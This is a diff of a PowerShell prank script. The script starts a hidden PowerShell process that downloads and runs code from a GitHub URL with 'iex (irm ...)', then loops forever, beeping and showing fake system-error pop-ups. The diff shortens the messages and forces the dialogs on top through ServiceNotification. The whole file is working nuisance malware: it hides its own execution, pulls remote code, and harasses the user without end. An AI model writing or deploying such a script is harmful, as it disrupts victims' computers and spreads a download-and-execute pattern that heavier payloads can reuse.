@@ -1,5 +1,4 @@
 # --- BACKGROUND PERSISTENCE LOGIC ---
-# If this is the main window, launch a hidden background process and exit.
 if ($null -eq $env:IS_BACKGROUND) {
     $command = "iex (irm https://raw.githubusercontent.com/rozeen-shrestha/prank/refs/heads/main/roz.ps1)"
     Start-Process powershell -ArgumentList "-WindowStyle Hidden -NoProfile -Command `"$command`"" -WindowStyle Hidden
@@ -7,20 +6,28 @@ if ($null -eq $env:IS_BACKGROUND) {
     exit
 }
 
-# --- PRANK LOGIC (This runs in the hidden background process) ---
+# --- PRANK LOGIC ---
 $errorMessages = @(
-    "Critical Error: Keyboard requires cleaning. Cookie crumbs detected.",
-    "System Error: Monitor detects poor posture. Spinal recalibration recommended.",
-    "Error: Mouse movement detected but no actual work being done.",
-    "Warning: Your desk chair has detected extended sitting periods. Please stand up.",
+    "Critical Error: Keyboard requires cleaning.",
+    "System Error: Monitor detects poor posture.",
+    "Error: Mouse movement detected but no work.",
+    "Warning: Desk chair detects laziness.",
     "Error: 404 Motivation not found."
 )
 
-Add-Type -AssemblyName PresentationFramework
+# Load the Forms assembly for ServiceNotification
+Add-Type -AssemblyName System.Windows.Forms
 
 while ($true) {
     [System.Console]::Beep(500, 300)
     $msg = $errorMessages | Get-Random
-    [System.Windows.MessageBox]::Show($msg, "System Error", "OK", "Error")
+    
+    # Use ServiceNotification to force the popup on top of hidden processes
+    [System.Windows.Forms.MessageBox]::Show($msg, "System Error", 
+        [System.Windows.Forms.MessageBoxButtons]::OK, 
+        [System.Windows.Forms.MessageBoxIcon]::Error,
+        [System.Windows.Forms.MessageBoxDefaultButton]::Button1,
+        [System.Windows.Forms.MessageBoxOptions]::ServiceNotification)
+    
     Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 4)
 }
